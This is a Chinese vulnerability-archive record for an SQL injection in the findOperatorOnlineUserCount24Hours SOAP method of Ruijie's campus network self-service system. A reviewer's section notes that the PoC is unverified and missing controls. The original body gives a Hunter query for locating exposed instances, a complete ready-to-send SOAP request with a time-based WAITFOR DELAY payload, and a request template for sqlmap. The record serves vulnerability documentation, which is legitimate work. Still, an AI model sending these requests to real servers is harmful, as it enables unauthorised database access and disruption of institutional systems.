---
source: "wy876 漏洞文库"
id: "vw-8c59eadfeb86d89d4ffd11a9"
entity_id: "ve-8c59eadfeb86d89d4ffd11a9"
schema_version: "1"
title: "锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞"
product: "Ruijie校园网自助服务系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求带JSESSIONID，SQL Server WAITFOR，软件版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9C%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9FfindOperatorOnlineUserCount24Hours%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ih7fhkepsw3xw3bf"
source_status: "recorded"
---

# 锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie校园网自助服务系统
- 本文讨论：findOperatorOnlineUserCount24Hours in0 SQL注入
- 版本、权限与配置前提：请求带JSESSIONID，SQL Server WAITFOR，软件版本未知
- 资料类型：SOAP SQL注入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 校园网服务软件误归IoT硬件
- 仅5秒延迟载荷无对照/响应，sqlmap段只是正常请求无工具参数/标注注入点
- Hunter标app语法需核，认证状态未解释

### 操作风险与恢复

- 延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入

### 待核与来源

- 数据库/版本/会话必要性待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
锐捷网络股份有限公司校园网自助服务系统findOperatorOnlineUserCount24Hours存在SQL注入漏洞。

# 二、影响版本
+ 锐捷网络股份有限公司校园网自助服务系统

# 三、资产测绘
+ hunter`app="校园网自助服务系统"`
+ 特征


# 四、漏洞复现
```http
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 399

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:findOperatorOnlineUserCount24Hours>
         <!--type: string-->
         <ser:in0>gero et';WAITFOR DELAY '0:0:5'--</ser:in0>
      </ser:findOperatorOnlineUserCount24Hours>
   </soapenv:Body>
</soapenv:Envelope>
```


sqlmap

```http
POST /selfservice/service/operatorReportorRoamService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=81AA808BC6E57EE95C343DD3FCB89394
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 399

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:findOperatorOnlineUserCount24Hours>
         <!--type: string-->
         <ser:in0>gero et</ser:in0>
      </ser:findOperatorOnlineUserCount24Hours>
   </soapenv:Body>
</soapenv:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ih7fhkepsw3xw3bf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
